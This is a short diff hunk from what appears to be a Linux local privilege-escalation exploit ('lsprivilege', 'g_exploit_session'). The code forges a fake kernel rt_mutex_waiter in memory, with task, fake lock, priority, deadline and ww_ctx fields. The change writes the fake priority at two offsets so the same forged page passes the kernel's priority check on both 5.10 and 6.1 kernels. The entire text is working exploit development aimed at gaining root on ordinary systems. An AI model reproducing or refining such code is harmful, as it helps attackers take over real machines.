@@ -443,8 +443,14 @@ namespace lsprivilege::support {
                     *request, write_layout);
                 put64(p, kernel::W0_OFF + 0x30, waiter_task); /* task */
                 put64(p, kernel::W0_OFF + 0x38, (session::g_exploit_session.heap.current.fake_lock)); /* lock */
-                put32(p, kernel::W0_OFF + 0x40, 0); /* wake_state */
-                put32(p, kernel::W0_OFF + 0x44, kernel::FAKE_WAITER_PRIO); /* prio */
+                /* Shallow-frame 5.10 rt_mutex_waiter has NO wake_state field:
+                 * prio sits at +0x40 (task_blocks_on_rt_mutex stores
+                 * task->prio there). Writing prio only at +0x44 (the 6.1
+                 * wake_state+prio layout) makes that kernel read prio=0 and
+                 * fail the erase gate's priority comparison. Keep 0x44 too so
+                 * the same page still works on 6.1-compact waiters. */
+                put32(p, kernel::W0_OFF + 0x40, kernel::FAKE_WAITER_PRIO); /* 5.10 prio */
+                put32(p, kernel::W0_OFF + 0x44, kernel::FAKE_WAITER_PRIO); /* 6.1 prio */
                 put64(p, kernel::W0_OFF + 0x48, 0); /* deadline */
                 put64(p, kernel::W0_OFF + 0x50, 0); /* ww_ctx */
             } else {
